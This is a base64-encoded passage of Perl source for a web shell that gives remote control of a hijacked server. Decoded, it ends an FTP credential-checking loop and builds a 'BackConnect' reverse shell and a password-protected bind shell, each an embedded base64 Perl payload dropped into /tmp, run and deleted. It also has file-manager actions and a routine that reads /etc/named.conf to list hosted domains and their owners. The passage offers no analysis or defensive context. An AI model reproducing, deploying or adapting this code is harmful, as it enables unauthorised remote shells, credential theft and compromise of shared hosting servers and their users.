ic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsNCgkJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQkJCWJyZWFrOw0KCQkJCQl9DQoJCQkJCWlmKCRpbnsnc2xlZXAnfSBuZSAiMCIpDQoJCQkJCXsNCgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pICogMTAwMCk7DQoJCQkJCX0NCgkJCQkJJGZ0cC0+cXVpdCgpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQkkcmVzdWx0IC49ICJcbjxicj49PT09PT09PT09Pj4+Pj4+Pj4+PiBGaW5pc2hlZCA8PDw8PDw8PDw8PT09PT09PT09PTxicj5cbiI7DQoJfQ0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBCYWNrY29ubmVjdCBGb3JtDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmRGb3JtDQp7DQoJcmV0dXJuIDw8RU5EOw0KCTxicj48YnI+DQoNCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CYWNrQ29ubmVjdDogPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImJhY2tiaW5kIj48L3RkPg0KCTx0ZD4gSG9zdDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjIwIiBuYW1lPSJjbGllbnRhZGRyIiB2YWx1ZT0iJEVOVnsnUkVNT1RFX0FERFInfSI+DQoJIFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSI2IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iODAiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiYScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+PC90ZD4NCg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJDb25uZWN0Ij48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIENsaWVudCBsaXN0ZW4gYmVmb3JlIGNvbm5lY3QgYmFjayENCgk8YnI+WytdIFRyeSBjaGVjayB5b3VyIFBvcnQgd2l0aCA8YSB0YXJnZXQ9Il9ibGFuayIgaHJlZj0iaHR0cDovL3d3dy5jYW55b3VzZWVtZS5vcmcvIj5odHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy88L2E+DQoJPGJyPlsrXSBDbGllbnQgbGlzdGVuIHdpdGggY29tbWFuZDogPHJ1bj5uYyAtdnYgLWwgLXAgPHNwYW4gaWQ9ImJhIj44MDwvc3Bhbj48L3J1bj48L2ZvbnQ+PC90ZD4NCg0KCTwvdHI+DQoJPC90YWJsZT4NCg0KCTxicj48YnI+DQoJPHRhYmxlPg0KCTx0cj4NCgk8Zm9ybSBtZXRob2Q9IlBPU1QiIGFjdGlvbj0iJFNjcmlwdExvY2F0aW9uIj4NCgk8dGQ+QmluZCBQb3J0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoNCgk8dGQ+IFBvcnQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxNSIgbmFtZT0iY2xpZW50cG9ydCIgdmFsdWU9IjE0MTIiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdiaScpLmlubmVySFRNTD10aGlzLnZhbHVlOyI+DQoNCgkgUGFzc3dvcmQ6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBzaXplPSIxMiIgbmFtZT0iYmluZHBhc3MiIHZhbHVlPSJ2aW5ha2lkIj48L3RkPg0KCTx0ZD48aW5wdXQgbmFtZT0icyIgdHlwZT0ic3VibWl0IiBuYW1lPSJzdWJtaXQiIHZhbHVlPSJCaW5kIj48L3RkPg0KCTwvZm9ybT4NCgk8L3RyPg0KCTx0cj4NCgk8dGQgY29sc3Bhbj0zPjxmb250IGNvbG9yPSNGRkZGRkY+WytdIFRlc3RpbmcgLi4uLg0KCTxicj5bK10gVHJ5IGNvbW1hbmQ6IDxydW4+bmMgJEVOVnsnU0VSVkVSX0FERFInfSA8c3BhbiBpZD0iYmkiPjE0MTI8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+PGJyPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IHVzZSBwZXJsDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmQNCnsNCgl1c2UgU29ja2V0OwkNCgkkYmFja3Blcmw9Ikl5RXZkWE55TDJKcGJpOXdaWEpzRFFwMWMyVWdTVTg2T2xOdlkydGxkRHNOQ2lSVGFHVnNiQWs5SUNJdlltbHVMMkpoYzJnaU93MEtKRUZTUjBNOVFFRlNSMVk3RFFwMWMyVWdVMjlqYTJWME93MEtkWE5sSUVacGJHVklZVzVrYkdVN0RRcHpiMk5yWlhRb1UwOURTMFZVTENCUVJsOUpUa1ZVTENCVFQwTkxYMU5VVWtWQlRTd2daMlYwY0hKdmRHOWllVzVoYldVb0luUmpjQ0lwS1NCdmNpQmthV1VnY0hKcGJuUWdJbHN0WFNCVmJtRmliR1VnZEc4Z1VtVnpiMngyWlNCSWIzTjBYRzRpT3cwS1kyOXVibVZqZENoVFQwTkxSVlFzSUhOdlkydGhaR1J5WDJsdUtDUkJVa2RXV3pGZExDQnBibVYwWDJGMGIyNG9KRUZTUjFaYk1GMHBLU2tnYjNJZ1pHbGxJSEJ5YVc1MElDSmJMVjBnVlc1aFlteGxJSFJ2SUVOdmJtNWxZM1FnU0c5emRGeHVJanNOQ25CeWFXNTBJQ0pEYjI1dVpXTjBaV1FoSWpzTkNsTlBRMHRGVkMwK1lYVjBiMlpzZFhOb0tDazdEUXB2Y0dWdUtGTlVSRWxPTENBaVBpWlRUME5MUlZRaUtUc05DbTl3Wlc0b1UxUkVUMVZVTENJK0psTlBRMHRGVkNJcE93MEtiM0JsYmloVFZFUkZVbElzSWo0bVUwOURTMFZVSWlrN0RRcHdjbWx1ZENBaUxTMDlQU0JEYjI1dVpXTjBaV1FnUW1GamEyUnZiM0lnUFQwdExTQWdYRzVjYmlJN0RRcHplWE4wWlcwb0luVnVjMlYwSUVoSlUxUkdTVXhGT3lCMWJuTmxkQ0JUUVZaRlNFbFRWQ0E3WldOb2J5QW5XeXRkSUZONWMzUmxiV2x1Wm04NklDYzdJSFZ1WVcxbElDMWhPMlZqYUc4N1pXTm9ieUFuV3l0ZElGVnpaWEpwYm1adk9pQW5PeUJwWkR0bFkyaHZPMlZqYUc4Z0oxc3JYU0JFYVhKbFkzUnZjbms2SUNjN0lIQjNaRHRsWTJodk95QmxZMmh2SUNkYksxMGdVMmhsYkd3NklDYzdKRk5vWld4c0lpazdEUXBqYkc5elpTQlRUME5MUlZRNyI7DQoJJGJpbmRwZXJsPSJJeUV2ZFhOeUwySnBiaTl3WlhKc0RRcDFjMlVnVTI5amEyVjBPdzBLSkVGU1IwTTlRRUZTUjFZN0RRb2tjRzl5ZEFrOUlDUkJVa2RXV3pCZE93MEtKSEJ5YjNSdkNUMGdaMlYwY0hKdmRHOWllVzVoYldVb0ozUmpjQ2NwT3cwS0pGTm9aV3hzQ1QwZ0lpOWlhVzR2WW1GemFDSTdEUXB6YjJOclpYUW9VMFZTVmtWU0xDQlFSbDlKVGtWVUxDQlRUME5MWDFOVVVrVkJUU3dnSkhCeWIzUnZLVzl5SUdScFpTQWljMjlqYTJWME9pUWhJanNOQ25ObGRITnZZMnR2Y0hRb1UwVlNWa1ZTTENCVFQweGZVMDlEUzBWVUxDQlRUMTlTUlZWVFJVRkVSRklzSUhCaFkyc29JbXdpTENBeEtTbHZjaUJrYVdVZ0luTmxkSE52WTJ0dmNIUTZJQ1FoSWpzTkNtSnBibVFvVTBWU1ZrVlNMQ0J6YjJOcllXUmtjbDlwYmlna2NHOXlkQ3dnU1U1QlJFUlNYMEZPV1NrcGIzSWdaR2xsSUNKaWFXNWtPaUFrSVNJN0RRcHNhWE4wWlc0b1UwVlNWa1ZTTENCVFQwMUJXRU5QVGs0cENRbHZjaUJrYVdVZ0lteHBjM1JsYmpvZ0pDRWlPdzBLWm05eUtEc2dKSEJoWkdSeUlEMGdZV05qWlhCMEtFTk1TVVZPVkN3Z1UwVlNWa1ZTS1RzZ1kyeHZjMlVnUTB4SlJVNVVLUTBLZXcwS0NXOXdaVzRvVTFSRVNVNHNJQ0krSmtOTVNVVk9WQ0lwT3cwS0NXOXdaVzRvVTFSRVQxVlVMQ0FpUGlaRFRFbEZUbFFpS1RzTkNnbHZjR1Z1S0ZOVVJFVlNVaXdnSWo0bVEweEpSVTVVSWlrN0RRb0pjM2x6ZEdWdEtDSjFibk5sZENCSVNWTlVSa2xNUlRzZ2RXNXpaWFFnVTBGV1JVaEpVMVFnTzJWamFHOGdKMXNyWFNCVGVYTjBaVzFwYm1adk9pQW5PeUIxYm1GdFpTQXRZVHRsWTJodk8yVmphRzhnSjFzclhTQlZjMlZ5YVc1bWJ6b2dKenNnYVdRN1pXTm9ienRsWTJodklDZGJLMTBnUkdseVpXTjBiM0o1T2lBbk95QndkMlE3WldOb2J6c2daV05vYnlBbld5dGRJRk5vWld4c09pQW5PeVJUYUdWc2JDSXBPdzBLQ1dOc2IzTmxLRk5VUkVsT0tUc05DZ2xqYkc5elpTaFRWRVJQVlZRcE93MEtDV05zYjNObEtGTlVSRVZTVWlrN0RRcDlEUW89IjsNCg0KCSRDbGllbnRBZGRyID0gJGlueydjbGllbnRhZGRyJ307DQoJJENsaWVudFBvcnQgPSBpbnQoJGlueydjbGllbnRwb3J0J30pOw0KCWlmKCRDbGllbnRQb3J0IGVxIDApDQoJew0KCQlyZXR1cm4gJkJhY2tCaW5kRm9ybTsNCgl9ZWxzaWYoISRDbGllbnRBZGRyIGVxICIiKQ0KCXsNCgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmFja3BlcmwpOw0KCQlpZigtdyAiL3RtcC8iKQ0KCQl7DQoJCQkkRmlsZT0iL3RtcC9iYWNrY29ubmVjdC5wbCI7CQ0KCQl9ZWxzZQ0KCQl7DQoJCQkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4iYmFja2Nvbm5lY3QucGwiOw0KCQl9DQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOw0KCQlwcmludCBGSUxFICREYXRhOw0KCQljbG9zZSBGSUxFOw0KCQlzeXN0ZW0oInBlcmwgJEZpbGUgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsNCgkJdW5saW5rKCRGaWxlKTsNCgkJZXhpdCAwOw0KCX1lbHNlDQoJew0KCQkkRGF0YT1kZWNvZGVfYmFzZTY0KCRiaW5kcGVybCk7DQoJCWlmKC13ICIvdG1wIikNCgkJew0KCQkJJEZpbGU9Ii90bXAvYmluZHBvcnQucGwiOwkNCgkJfWVsc2UNCgkJew0KCQkJJEZpbGU9JEN1cnJlbnREaXIuJFBhdGhTZXAuImJpbmRwb3J0LnBsIjsNCgkJfQ0KCQlvcGVuKEZJTEUsICI+JEZpbGUiKTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJc3lzdGVtKCJwZXJsICRGaWxlICRDbGllbnRQb3J0Iik7DQoJCXVubGluaygkRmlsZSk7DQoJCWV4aXQgMDsNCgl9DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojICBBcnJheSBMaXN0IERpcmVjdG9yeQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFJtRGlyKCQpIA0Kew0KCW15ICRkaXIgPSBzaGlmdDsNCglpZihvcGVuZGlyKERJUiwkZGlyKSkNCgl7DQoJCXdoaWxlKCRmaWxlID0gcmVhZGRpcihESVIpKQ0KCQl7DQoJCQlpZigoJGZpbGUgbmUgIi4iKSAmJiAoJGZpbGUgbmUgIi4uIikpDQoJCQl7DQoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7DQoJCQkJaWYoLWQgJGZpbGUpDQoJCQkJew0KCQkJCQkmUm1EaXIoJGZpbGUpOw0KCQkJCX0NCgkJCQllbHNlDQoJCQkJew0KCQkJCQl1bmxpbmsoJGZpbGUpOw0KCQkJCX0NCgkJCX0NCgkJfQ0KCQljbG9zZWRpcihESVIpOw0KCX0NCn0NCnN1YiBGaWxlT3duZXIoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCWlmKC1lICRmaWxlKQ0KCXsNCgkJKCR1aWQsJGdpZCkgPSAoc3RhdCgkZmlsZSkpWzQsNV07DQoJCWlmKCRXaW5OVCkNCgkJew0KCQkJcmV0dXJuICI/Pz8iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJG5hbWU9Z2V0cHd1aWQoJHVpZCk7DQoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7DQoJCQlyZXR1cm4gJG5hbWUuIi8iLiRncm91cDsNCgkJfQ0KCX0NCglyZXR1cm4gIj8/PyI7DQp9DQpzdWIgUGFyZW50Rm9sZGVyKCQpDQp7DQoJbXkgJHBhdGggPSBzaGlmdDsNCglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7DQoJY2hvcCgkcGF0aCA9IGAkQ29tbWApOw0KCXJldHVybiAkcGF0aDsNCn0NCnN1YiBGaWxlUGVybXMoJCkNCnsNCglteSAkZmlsZSA9IHNoaWZ0Ow0KCW15ICR1ciA9ICItIjsNCglteSAkdXcgPSAiLSI7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQlpZigkV2luTlQpDQoJCXsNCgkJCWlmKC1yICRmaWxlKXsgJHVyID0gInIiOyB9DQoJCQlpZigtdyAkZmlsZSl7ICR1dyA9ICJ3IjsgfQ0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3Ow0KCQl9ZWxzZQ0KCQl7DQoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOw0KCQkJJHJlc3VsdCA9IHNwcmludGYoIiUwNG8iLCAkbW9kZSAmIDA3Nzc3KTsNCgkJCXJldHVybiAkcmVzdWx0Ow0KCQl9DQoJfQ0KCXJldHVybiAiMDAwMCI7DQp9DQpzdWIgRmlsZUxhc3RNb2RpZmllZCgkKQ0Kew0KCW15ICRmaWxlID0gc2hpZnQ7DQoJaWYoLWUgJGZpbGUpDQoJew0KCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07DQoJCSgkZCwkbSwkeSwkaCwkaSkgPSAobG9jYWx0aW1lKCRsYSkpWzMsNCw1LDIsMV07DQoJCSR5ID0gJHkgKyAxOTAwOw0KCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87DQoJCSRsbXRpbWUgPSBzcHJpbnRmKCIlMDJkLyVzLyU0ZCAlMDJkOiUwMmQiLCRkLCRtb250aFskbV0sJHksJGgsJGkpOw0KCQlyZXR1cm4gJGxtdGltZTsNCgl9DQoJcmV0dXJuICI/Pz8iOw0KfQ0Kc3ViIEZpbGVTaXplKCQpDQp7DQoJbXkgJGZpbGUgPSBzaGlmdDsNCglpZigtZiAkZmlsZSkNCgl7DQoJCXJldHVybiAtcyAiJGZpbGUiOw0KCX0NCglyZXR1cm4gIjAiOw0KfQ0Kc3ViIFBhcnNlRmlsZVNpemUoJCkNCnsNCglteSAkc2l6ZSA9IHNoaWZ0Ow0KCWlmKCRzaXplIDw9IDEwMjQpDQoJew0KCQlyZXR1cm4gJHNpemUuICIgQiI7DQoJfQ0KCWVsc2UNCgl7DQoJCWlmKCRzaXplIDw9IDEwMjQqMTAyNCkgDQoJCXsNCgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7DQoJCQlyZXR1cm4gJHNpemUuIiBLQiI7DQoJCX0NCgkJZWxzZSANCgkJew0KCQkJJHNpemUgPSBzcHJpbnRmKCIlLjJmIiwkc2l6ZSAvIDEwMjQgLyAxMDI0KTsNCgkJCXJldHVybiAkc2l6ZS4iIE1CIjsNCgkJfQ0KCX0NCn0NCnN1YiB0cmltKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmcgPX4gcy9eXHMrLy87DQoJJHN0cmluZyA9fiBzL1xzKyQvLzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBBZGRTbGFzaGVzKCQpDQp7DQoJbXkgJHN0cmluZyA9IHNoaWZ0Ow0KCSRzdHJpbmc9fiBzL1xcL1xcXFwvZzsNCglyZXR1cm4gJHN0cmluZzsNCn0NCnN1YiBUcmltU2xhc2hlcygkKQ0Kew0KCW15ICRzdHJpbmcgPSBzaGlmdDsNCgkkc3RyaW5nPX4gcy9cL1wvL1wvL2c7DQoJJHN0cmluZz1+IHMvXFxcXC9cXC9nOw0KCXJldHVybiAkc3RyaW5nOw0KfQ0Kc3ViIExpc3REaXINCnsNCglteSAkcGF0aCA9ICZUcmltU2xhc2hlcygkQ3VycmVudERpci4kUGF0aFNlcCk7DQoJbXkgJHJlc3VsdCA9ICI8Zm9ybSBuYW1lPSdmJyBvblN1Ym1pdD1cIkVuY29kZXIoJ2QnKVwiIGFjdGlvbj0nJFNjcmlwdExvY2F0aW9uJz48c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPlBhdGg6IFsgIi4mQWRkTGlua0RpcigiZ3VpIikuIiBdIDwvc3Bhbj48aW5wdXQgdHlwZT0ndGV4dCcgaWQ9J2QnIG5hbWU9J2QnIHNpemU9JzQwJyB2YWx1ZT0nJEN1cnJlbnREaXInIC8+PGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYScgdmFsdWU9J2d1aSc+PGlucHV0IGNsYXNzPSdzdWJtaXQnIHR5cGU9J3N1Ym1pdCcgdmFsdWU9J0NoYW5nZSc+PC9mb3JtPiI7DQoJaWYoLWQgJHBhdGgpDQoJew0KCQlteSBAZm5hbWUgPSAoKTsNCgkJbXkgQGRuYW1lID0gKCk7DQoJCWlmKG9wZW5kaXIoRElSLCRwYXRoKSkNCgkJew0KCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpDQoJCQl7DQoJCQkJJGY9JHBhdGguJGZpbGU7DQoJCQkJaWYoLWQgJGYpDQoJCQkJew0KCQkJCQlwdXNoKEBkbmFtZSwkZmlsZSk7DQoJCQkJfQ0KCQkJCWVsc2UNCgkJCQl7DQoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsNCgkJCQl9DQoJCQl9DQoJCQljbG9zZWRpcihESVIpOw0KCQl9DQoJCUBmbmFtZSA9IHNvcnQgeyBsYygkYSkgY21wIGxjKCRiKSB9IEBmbmFtZTsNCgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOw0KCQkkcmVzdWx0IC49ICI8ZGl2Pjx0YWJsZSB3aWR0aD0nOTAlJyBjbGFzcz0nbGlzdGRpcic+DQoJCTx0ciBzdHlsZT0nYmFja2dyb3VuZC1jb2xvcjogIzNlM2UzZSc+PHRoPkZpbGUgTmFtZTwvdGg+DQoJCTx0aCB3aWR0aD0nMTAwJz5GaWxlIFNpemU8L3RoPg0KCQk8dGggd2lkdGg9JzE1MCc+T3duZXI8L3RoPg0KCQk8dGggd2lkdGg9JzEwMCc+UGVybWlzc2lvbjwvdGg+DQoJCTx0aCB3aWR0aD0nMTUwJz5MYXN0IE1vZGlmaWVkPC90aD4NCgkJPHRoIHdpZHRoPScyMzAnPkFjdGlvbjwvdGg+PC90cj4iOw0KCQlteSAkc3R5bGU9Im5vdGxpbmUiOw0KCQlteSAkaT0wOw0KCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZCA9ICZ0cmltKCRkKTsNCgkJCSRkaXJuYW1lPSRkOw0KCQkJaWYoJGQgZXEgIi4uIikgDQoJCQl7DQoJCQkJJGQgPSAmUGFyZW50Rm9sZGVyKCRwYXRoKTsNCgkJCX0NCgkJCWVsc2lmKCRkIGVxICIuIikgDQoJCQl7DQoJCQkJbmV4dDsNCgkJCX0NCgkJCWVsc2UgDQoJCQl7DQoJCQkJJGQgPSAkcGF0aC4kZDsNCgkJCX0NCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIGNsYXNzPSdkaXInPjxhICBocmVmPSc/YT1ndWkmZD0iLiZFbmNvZGVEaXIoJGQpLiInPlsgIi4kZGlybmFtZS4iIF08L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPkRJUjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQgaWQ9J0ZpbGVQZXJtc18kaScgb25kYmxjbGljaz1cInJtX2NobW9kX2Zvcm0odGhpcywiLiRpLiIsJyIuJkZpbGVQZXJtcygkZCkuIicsJyIuJGRpcm5hbWUuIicpXCIgPjxzcGFuIG9uY2xpY2s9XCJjaG1vZF9mb3JtKCIuJGkuIiwnIi4kZGlybmFtZS4iJylcIiA+Ii4mRmlsZVBlcm1zKCRkKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlTGFzdE1vZGlmaWVkKCRkKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPjxhIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGRpcm5hbWUnLCciLiZBZGRTbGFzaGVzKCZBZGRTbGFzaGVzKCRkKSkuIicpOyByZXR1cm4gZmFsc2U7IFwiPlJlbmFtZTwvYT4gIHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZGlyOiAkZGlybmFtZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0iLiZFbmNvZGVEaXIoJHBhdGgpLiImcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPC90cj4iOw0KCQkJJGkrKzsNCgkJfQ0KCQlmb3JlYWNoIG15ICRmIChAZm5hbWUpDQoJCXsNCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7DQoJCQkkZmlsZT0kZjsNCgkJCSRmID0gJHBhdGguJGY7DQoJCQlteSAkYWN0aW9uID0gZW5jb2RlX2Jhc2U2NCgiZWRpdCAiLiRmaWxlKTsNCgkJCSR2aWV3ID0gIj9kaXI9Ii4kcGF0aC4iJnZpZXc9Ii4kZjsNCgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIGNsYXNzPSdmaWxlJz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJmM9Ii4kYWN0aW9uLiInPiIuJGZpbGUuIjwvYT48L3RkPiI7DQoJCQkkcmVzdWx0IC49ICI8dGQ+Ii4mUGFyc2VGaWxlU2l6ZSgmRmlsZVNpemUoJGYpKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRmKS4iJywnIi4kZmlsZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oJGksJyRmaWxlJylcIiA+Ii4mRmlsZVBlcm1zKCRmKS4iPC9zcGFuPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjx0ZD4iLiZGaWxlTGFzdE1vZGlmaWVkKCRmKS4iPC90ZD4iOw0KCQkJJHJlc3VsdCAuPSAiPHRkPjxhIG9uY2xpY2s9XCJyZW5hbWVfZm9ybSgkaSwnJGZpbGUnLCdmJyk7IHJldHVybiBmYWxzZTtcIj5SZW5hbWU8L2E+IHwgPGEgaHJlZj0nP2E9ZG93bmxvYWQmbz1nbyZmPSIuJGYuIic+RG93bmxvYWQ8L2E+IHwgPGEgb25jbGljaz1cImlmKCFjb25maXJtKCdSZW1vdmUgZmlsZTogJGZpbGUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9Ii4mRW5jb2RlRGlyKCRwYXRoKS4iJnJlbW92ZT0kZmlsZSc+UmVtb3ZlPC9hPjwvdGQ+IjsNCgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsNCgkJCSRpKys7DQoJCX0NCgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOw0KCX0NCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVHJ5IHRvIFZpZXcgTGlzdCBVc2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVmlld0RvbWFpblVzZXINCnsNCglvcGVuIChkMG1haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOw0KCW15IEBjbnpzID0gPGQwbWFpbnM+Ow0KCWNsb3NlIGQwbWFpbnM7DQoJbXkgJHN0eWxlPSJsaW5lIjsNCglteSAkcmVzdWx0PSI8aDM+PGZvbnQgc3R5bGU9J2ZvbnQ6IDE1cHQgVmVyZGFuYTtjb2xvcjogI2ZmOTkwMDsnPkRvbWFpbiArIFVzZXI8L2ZvbnQ+PC9oMz4iOw0KCWlmICgkZXJyKQ0KCXsNCgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7DQoJCXJldHVybiAkcmVzdWx0Ow0KCX1lbHNlDQoJew0KCQkkcmVzdWx0IC49ICc8dGFibGUgaWQ9ImRvbWFpbiI+PHRyPjx0aD5kMG1haW5zPC90aD4gPHRoPlVzZXI8L3RoPjwvdHI+JzsNCgl9DQoJZm9yZWFjaCBteSAkb25lIChAY256cykNCgl7DQoJCWlmKCRvbmUgPX4gbS8uKj96b25lICIoLio/KSIgey8pDQoJCXsJDQoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOw0KCQkJJGZpbGVuYW1lPSB0cmltKCIvZXRjL3ZhbGlhc2VzLyIuJDEpOw0KCQkJJG93bmVyID0gZ2V0cHd1aWQoKHN0YXQoJGZpbGVuYW1lKSlbNF0pOw0KCQkJJHJlc3VsdCAuPSAnPHRyIHN0eWxlPSIkc3R5bGUiIHdpZHRoPTUwJT48dGQ+PGEgaHJlZj0iaHR0cDovLycuJDEuJyIgdGFyZ2V0PSJfYmxhbmsiPicuJDEuJzwvYT48L3RkPjx0ZD4gJy4kb3duZXIuJzwvdGQ+PC90cj4nOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJzwvdGFibGU+JzsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVmlldyBMb2cNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t